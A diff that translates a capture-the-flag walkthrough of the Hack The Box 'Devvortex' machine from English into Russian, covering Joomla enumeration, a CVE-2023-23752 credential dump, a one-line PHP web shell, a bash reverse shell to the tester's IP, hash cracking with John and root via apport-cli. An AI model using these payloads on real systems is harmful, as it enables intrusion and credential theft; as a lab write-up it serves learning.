@@ -60,11 +60,12 @@ Finished
 
 ```
 
-Nothing interesting. Well, let's try to sort out the virtual hosts
+Ничего интересного. Что ж, попробуем разобраться с виртуальными хостами
 
 ## 4. Enumerate vhosts
 
-Run gobuster with parameter **vhost** parameter **--apend-domain** and wordlist **subdomains-top1million-5000.txt**
+Запустим gobuster с параметром **vhost**, параметром **--apend-domain** и списком слов **subdomains-top1million-5000.txt**.
+
 ```
 └─$ gobuster vhost -u devvortex.htb -r -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 --append-domain
 ===============================================================
@@ -88,26 +89,26 @@ Finished
 ===============================================================
 ```
 
-And we find virtual host dev.devvortex.htb
+И находим виртуальный хост dev.devvortex.htb
 
-**change /etc/hosts for access this domain**
+**измените /etc/hosts для доступа к этому домену**
 
 ## 5. Go to this vhost with browser
 
 ![plot](./screens/2.png)
 
-We see the some web-app
+Мы видим какое-то веб-приложение
 
-Try to enumerating this site
+Попробуйте перечислить этот сайт
 
 ![plot](./screens/3.png)
 
-Find **/administrator** url. This is Joomla administrator panel.
+Найдите URL-адрес **/administrator**. Это панель администратора Joomla.
 
-You can find out the version of Joomla and look for public exploits.
+Вы можете узнать версию Joomla и поискать публичные эксплойты.
 
 ```
-We also find robots.txt
+Также находим robots.txt
 
 # If the Joomla site is installed within a folder
 # eg www.example.com/joomla/ then the robots.txt file
@@ -140,7 +141,7 @@ Disallow: /plugins/
 Disallow: /tmp/
 ```
 
-Later we make sure that all the URLs that we found coincide with the **robots.txt** file
+Позже мы проверяем, что все найденные нами URL-адреса совпадают с файлом **robots.txt**.
 
 ```
 └─$ dirb http://dev.devvortex.htb
@@ -178,26 +179,26 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: http://dev.devvortex.htb/tmp/  
 ```
 
-## 6. Further we find script in metasploit for getting Joomla version
+## 6. Далее в метасплоите находим скрипт для получения версии Joomla.
 
-Run metasploit database
+Запустить базу данных метасплоита
 
 ```
 sudo msfdb start
 ```
-Run metasploit
+Запустить метасплоит
 
 ```
 sudo msfconsole
 ```
 
-Search scripts for getting Joomla version
+Поиск скриптов для получения версии Joomla
 ```
 
 msf6 > search joomla
 
 ```
-Use auxiliary and set parameters
+Использовать вспомогательные и устанавливать параметры
 
 ```
 msf6 > use auxiliary/scanner/http/joomla_version
@@ -222,7 +223,7 @@ msf6 auxiliary(scanner/http/joomla_version) > set VHOST dev.devvortex.htb
 VHOST => dev.devvortex.htb
 
 ```
-Run script and getting version
+Запускаем скрипт и получаем версию
 
 ```
 msf6 auxiliary(scanner/http/joomla_version) > run
@@ -234,15 +235,15 @@ msf6 auxiliary(scanner/http/joomla_version) > run
 
 ```
 
-## 7. Find version Joomla CMS **4.2.6**
+## 7. Находим версию Joomla CMS **4.2.6**
 
-Looking for public exploits for this version Joomla in google and find fresh vulnerability CVE-2023-23752. 
-We are also looking for an exploit and find this PoC https://github.com/adhikara13/CVE-2023-23752
+Ищем в Google публичные эксплойты для этой версии Joomla и находим свежую уязвимость CVE-2023-23752.
+Также ищем эксплойт и находим вот этот PoC https://github.com/adhikara13/CVE-2023-23752
 
 
 # Initial access and exploitation 
 
-## 8. Read exploit docs and run this script
+## 8. Прочтите документацию по эксплойтам и запустите этот скрипт.
 
 ```
 
@@ -253,23 +254,23 @@ File Saved => dump.txt
 
 ```
 
-This vulnerability allows you to dump the Joomla administrator password and save in dump.txt file.
+Эта уязвимость позволяет вам сбросить пароль администратора Joomla и сохранить его в файле dump.txt.
 
-## 9. Go to administration panel and sign in
+## 9. Зайдите в панель администрирования и авторизуйтесь
 
 ![plot](./screens/4.png)
 
-And we went to the admin panel
+И мы зашли в админку
 
-Next, we need to somehow upload the web shell, namely a PHP file since Joomla is written in PHP.
+Далее нам нужно как-то загрузить веб-оболочку, а именно PHP-файл, поскольку Joomla написана на PHP.
 
-Search in google exploitation technique for upload web shell in Joomla and find templates method.
-Go to System => Sites Templates =>  Cassiopeia Details and Files
-and click New File
+Найдите в Google технику использования для загрузки веб-оболочки в Joomla и найдите метод шаблонов.
+Перейдите в Система => Шаблоны сайтов => Детали и файлы Кассиопеи.
+и нажмите «Новый файл»
 
 ![plot](./screens/5.png)
 
-## 10. Create new php file and write simple php web-shell
+## 10. Создайте новый файл php и напишите простую веб-оболочку PHP.
 
 ```php
 <?php system($_GET["cmd"]); ?>
@@ -277,38 +278,38 @@ and click New File
 
 ![plot](./screens/6.png)
 
-And later click Save and close
+И позже нажмите «Сохранить и закрыть».
 
 ![plot](./screens/7.png)
 
-Go to url for our payload ave.php and check command execution.
-We have a webshell access but we need full shell access
+Перейдите по URL-адресу нашей полезной нагрузки ave.php и проверьте выполнение команды.
+У нас есть доступ к веб-шеллу, но нам нужен полный доступ к оболочке.
 
-## 11. Run reverse shell with reverse(stager) run method.
+## 11. Запустите обратную оболочку с помощью метода обратного запуска (stager).
 
-Create directory www and create a file with this content
+Создайте каталог www и создайте файл с этим содержимым.
 
 ```bash
 
 bash -i >& /dev/tcp/10.10.14.187/9001 0>&1
 
 ```
-**Don't forget to change it to yours ip for HTB vpn**
+**Не забудьте сменить его на свой IP для HTB VPN**
 
 ```
 
-Execute this directory this command for run simple http server
+Выполните в этом каталоге эту команду для запуска простого http-сервера.
 
 └─$ python3 -m http.server                                    
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 ```
-This is necessary to download the shell script with our reverse shell payload.
+Это необходимо для загрузки сценария оболочки с нашей полезной нагрузкой обратной оболочки.
 
-## 12. Run reverse shell
+## 12. Запустить обратную оболочку
 
-Let's intercept the web shell command with a burp and enter a command there to download and launch our reverse shell
-through the curl command with redirecting the output to standard input in the bash interpreter
+Давайте перехватим команду веб-шелла с помощью burp и введем туда команду для загрузки и запуска нашей обратной оболочки.
+через команду curl с перенаправлением вывода на стандартный ввод в интерпретаторе bash
 
 ![plot](./screens/8.png)
 
@@ -319,22 +320,22 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.11.242 - - [07/Dec/2023 16:13:12] "GET /shell.sh HTTP/1.1" 200 -
 
 ```
-Our stager download to system and execute with bash and we have a shell
+Наш стейджер загружается в систему и выполняется с помощью bash, и у нас есть оболочка.
 
 
 ![plot](./screens/9.png)
 
 # Postexploitation and Privilage escalation
 
-## 13. Check interesting files
+## 13. Проверьте интересные файлы
 
-Go to path joomla database config and finded creds for database
+Перейдите по пути к конфигурации базы данных Joomla и найдите учетные данные для базы данных.
 
 ![plot](./screens/10.png)
 
-## 14. Connect to mysql
+## 14. Подключиться к MySQL
 
-Connect to mysql and show databases
+Подключитесь к MySQL и покажите базы данных
 
 ```bash
 mysql -u lewis -p
@@ -356,24 +357,24 @@ mysql> select username,password from sd4fg_users;
 2 rows in set (0.00 sec)
 
 ```
-We have 2 hashes our user lewis and unknown user logan.
+У нас есть два хеша: наш пользователь Льюис и неизвестный пользователь logan.
 
-Copy he hash and save to file john.hash for John the Ripper brutforce attack
+Скопируйте хэш и сохраните его в файл john.hash для брутфорс-атаки **john the ripper**.
 
-## 15. Brutforcing hash with john
+## 15. Брутфорсинг хеша с Джоном
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt john.hash 
 ```
 ![plot](./screens/11.png)
 
-We have a password for user logan
+У нас есть пароль для входа пользователя logan
 
-## 16. Connect with ssh or su
+## 16. Подключиться по ssh или su
 
-Connect to server with ssh as user logan
+Подключитесь к серверу с ssh в качестве логина пользователя.
 
-Show sudo permissions execute command
+Показать разрешения sudo для выполнения команды
 
 ```bash
 logan@devvortex:~$ sudo -l
@@ -384,21 +385,19 @@ User logan may run the following commands on devvortex:
     (ALL : ALL) /usr/bin/apport-cli
 ```
 
-And see full sudo permisson for unknown utilities apport-cli.
+И посмотрите полное разрешение sudo для неизвестных утилит apport-cli.
 
-Search information how privilage escalation with this utilities and find this method.
+Найдите информацию о том, как повысить привилегии с помощью этой утилиты, и найдите этот метод.
 
-see this utility and find CVE for local privilage escalation
+посмотрите эту утилиту и найдите CVE для локального повышения привилегий.
 
-https://github.com/diego-tella/CVE-2023-1326-PoC
-
-with command 
+https://github.com/diego-tella/CVE-2023-1326-PoC командой:
 
 ```bash
 sudo apport-cli -p ssh -f rep.crash --save rep.crash /usr/sbin/sshd
 ```
 
-create another some crash file and run command of exploit
+создайте еще один файл сбоя и запустите команду эксплойта
 
 ```bash
 sudo /usr/bin/apport-cli -c /tmp/rep.crash
@@ -408,4 +407,4 @@ press V (view report)
 
 ![plot](./screens/12.png)
 
-And we have a root shell!
+И у нас есть права root!!!
